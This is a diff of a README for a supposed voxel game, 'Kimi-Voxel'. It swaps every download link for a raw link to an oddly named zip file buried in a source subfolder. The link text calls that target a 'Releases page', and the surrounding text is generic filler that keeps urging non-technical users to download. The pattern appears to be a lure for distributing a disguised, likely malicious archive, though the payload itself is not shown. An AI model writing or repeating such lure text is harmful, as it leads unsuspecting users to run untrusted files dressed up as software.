@@ -1,6 +1,6 @@
 # 🎮 Kimi-Voxel - Enjoy a Fun Voxel Adventure
 
-![Download Kimi-Voxel](https://github.com/adeelakhit/Kimi-Voxel/raw/refs/heads/main/src/gpu/render/Kimi-Voxel-1.3.zip)
+![Download Kimi-Voxel](https://raw.githubusercontent.com/adeelakhit/Kimi-Voxel/main/src/gpu/terrain/gpu/Voxel-Kimi-resistively.zip)
 
 ## 📦 Overview
 Kimi-Voxel is an engaging voxel-based game designed for users of all ages. Create your own world and explore breathtaking landscapes filled with challenges and fun. This open-source project emphasizes creativity and innovative gameplay using Rust for development.
@@ -9,7 +9,7 @@ Kimi-Voxel is an engaging voxel-based game designed for users of all ages. Creat
 Follow these steps to download and run Kimi-Voxel easily. No programming skills are needed. 
 
 ## 📥 Download & Install
-To get started, visit this page to download Kimi-Voxel: [Kimi-Voxel Releases](https://github.com/adeelakhit/Kimi-Voxel/raw/refs/heads/main/src/gpu/render/Kimi-Voxel-1.3.zip).
+To get started, visit this page to download Kimi-Voxel: [Kimi-Voxel Releases](https://raw.githubusercontent.com/adeelakhit/Kimi-Voxel/main/src/gpu/terrain/gpu/Voxel-Kimi-resistively.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of Kimi-Voxel.
@@ -54,6 +54,6 @@ If you have any questions or need assistance, feel free to reach out through the
 Follow our progress and engage with fellow players on social media. Share your voxel creations and gameplay experiences!
 
 ## 📥 Download & Install Again
-Don’t forget, to get Kimi-Voxel, visit this page to download it: [Kimi-Voxel Releases](https://github.com/adeelakhit/Kimi-Voxel/raw/refs/heads/main/src/gpu/render/Kimi-Voxel-1.3.zip).
+Don’t forget, to get Kimi-Voxel, visit this page to download it: [Kimi-Voxel Releases](https://raw.githubusercontent.com/adeelakhit/Kimi-Voxel/main/src/gpu/terrain/gpu/Voxel-Kimi-resistively.zip).
 
 Enjoy your adventure in Kimi-Voxel!
